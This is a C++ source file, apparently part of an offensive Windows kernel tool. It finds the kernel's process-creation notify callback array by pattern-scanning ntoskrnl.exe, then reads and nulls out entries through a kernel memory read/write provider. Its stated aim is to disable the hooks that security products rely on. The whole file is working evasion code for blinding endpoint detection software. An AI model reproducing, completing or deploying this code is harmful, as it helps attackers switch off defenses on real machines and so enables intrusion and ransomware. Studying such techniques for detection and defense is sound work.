/**
 * @file Callbacks.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the implementation of the Callbacks class.
 *
 * Implements the logic for finding kernel callback arrays via pattern
 * scanning ntoskrnl.exe, and for reading and clearing entries in those
 * arrays to disable security product hooks.
 */

#include "Callbacks.h"
#include "Utils.h"
#include <iostream>
#include <Windows.h>

namespace {
    // Helper for pattern scanning, duplicated for modularity but could be centralized.
    uintptr_t FindPattern(uintptr_t base, size_t size, const char* pattern, const char* mask) {
        size_t patternLength = strlen(mask);
        for (size_t i = 0; i < size - patternLength; ++i) {
            bool found = true;
            for (size_t j = 0; j < patternLength; ++j) {
                if (mask[j] != '?' && pattern[j] != *(char*)(base + i + j)) {
                    found = false;
                    break;
                }
            }
            if (found) {
                return base + i;
            }
        }
        return 0;
    }
}

namespace KernelMode {

    // Maximum number of callbacks supported by the kernel.
    constexpr int MAX_PROCESS_CALLBACKS = 64;

    Callbacks::Callbacks(std::shared_ptr<Providers::IProvider> provider)
        : provider(std::move(provider)), processNotifyRoutineArray(0) {}

    uintptr_t Callbacks::FindProcessNotifyRoutineArray() {
        if (processNotifyRoutineArray != 0) {
            return processNotifyRoutineArray;
        }

        uintptr_t ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            std::wcerr << L"[-] Failed to get base address of ntoskrnl.exe." << std::endl;
            return 0;
        }

        char systemPath[MAX_PATH];
        GetSystemDirectoryA(systemPath, MAX_PATH);
        strcat_s(systemPath, "\\ntoskrnl.exe");
        HMODULE ntoskrnlModule = LoadLibraryExA(systemPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!ntoskrnlModule) {
            std::wcerr << L"[-] Failed to load ntoskrnl.exe into user space: " << GetLastError() << std::endl;
            return 0;
        }

        auto dosHeader = (PIMAGE_DOS_HEADER)ntoskrnlModule;
        auto ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)ntoskrnlModule + dosHeader->e_lfanew);

        // Find reference to PsSetCreateProcessNotifyRoutine, which contains the array.
        // Pattern for a call to ExReferenceCallBackBlock, often near the array.
        // 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 48 8B F8
        const char* pattern = "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xF8";
        const char* mask = "xxx????x????xxx";

        uintptr_t patternAddress = FindPattern((uintptr_t)ntoskrnlModule, ntHeaders->OptionalHeader.SizeOfImage, pattern, mask);
        if (!patternAddress) {
            std::wcerr << L"[-] Could not find PspCreateProcessNotifyRoutine pattern in ntoskrnl.exe." << std::endl;
            FreeLibrary(ntoskrnlModule);
            return 0;
        }

        int32_t offset = *(int32_t*)(patternAddress + 3);
        uintptr_t rva = (patternAddress - (uintptr_t)ntoskrnlModule) + 7 + offset;
        this->processNotifyRoutineArray = ntoskrnlBase + rva;

        FreeLibrary(ntoskrnlModule);

        std::wcout << L"[+] Found PspCreateProcessNotifyRoutine array at: 0x" << std::hex << this->processNotifyRoutineArray << std::endl;
        return this->processNotifyRoutineArray;
    }

    std::vector<uintptr_t> Callbacks::EnumerateProcessCallbacks() {
        uintptr_t arrayAddress = FindProcessNotifyRoutineArray();
        if (!arrayAddress) {
            return {};
        }
        return EnumerateCallbacks(arrayAddress, MAX_PROCESS_CALLBACKS);
    }

    bool Callbacks::RemoveProcessCallback(uintptr_t routineAddress) {
        uintptr_t arrayAddress = FindProcessNotifyRoutineArray();
        if (!arrayAddress) {
            return false;
        }
        return RemoveCallback(arrayAddress, routineAddress, MAX_PROCESS_CALLBACKS);
    }

    std::vector<uintptr_t> Callbacks::EnumerateCallbacks(uintptr_t arrayAddress, int maxCallbacks) {
        std::vector<uintptr_t> routines;
        std::vector<uintptr_t> callbackBlocks(maxCallbacks);

        if (!provider->ReadKernelMemory(arrayAddress, callbackBlocks.data(), maxCallbacks * sizeof(uintptr_t))) {
            std::wcerr << L"[-] Failed to read callback array from kernel." << std::endl;
            return {};
        }

        for (int i = 0; i < maxCallbacks; ++i) {
            uintptr_t blockPtr = callbackBlocks[i];
            if (blockPtr == 0) continue;

            // The pointer in the array is masked. We need to unmask it.
            blockPtr &= ~0xF; // On x64, lower bits are flags.

            if (blockPtr != 0) {
                uintptr_t routinePtr = 0;
                // The routine pointer is the first member of the EX_CALLBACK_ROUTINE_BLOCK
                if (provider->ReadKernelMemory(blockPtr, routinePtr)) {
                    if(routinePtr != 0) routines.push_back(routinePtr);
                }
            }
        }
        return routines;
    }

    bool Callbacks::RemoveCallback(uintptr_t arrayAddress, uintptr_t routineAddress, int maxCallbacks) {
        std::vector<uintptr_t> callbackBlocks(maxCallbacks);

        if (!provider->ReadKernelMemory(arrayAddress, callbackBlocks.data(), maxCallbacks * sizeof(uintptr_t))) {
            std::wcerr << L"[-] Failed to read callback array from kernel for removal." << std::endl;
            return false;
        }

        for (int i = 0; i < maxCallbacks; ++i) {
            uintptr_t blockPtr = callbackBlocks[i];
            if (blockPtr == 0) continue;

            uintptr_t unmaskedBlockPtr = blockPtr & ~0xF;
            if (unmaskedBlockPtr == 0) continue;

            uintptr_t currentRoutine = 0;
            if (provider->ReadKernelMemory(unmaskedBlockPtr, currentRoutine)) {
                if (currentRoutine == routineAddress) {
                    uintptr_t nullValue = 0;
                    if (provider->WriteKernelMemory(arrayAddress + i * sizeof(uintptr_t), nullValue)) {
                        std::wcout << L"[+] Successfully removed callback at address 0x" << std::hex << routineAddress << std::endl;
                        return true;
                    } else {
                        std::wcerr << L"[-] Failed to write NULL to callback array." << std::endl;
                        return false;
                    }
                }
            }
        }

        std::wcerr << L"[-] Could not find specified callback routine to remove." << std::endl;
        return false;
    }
}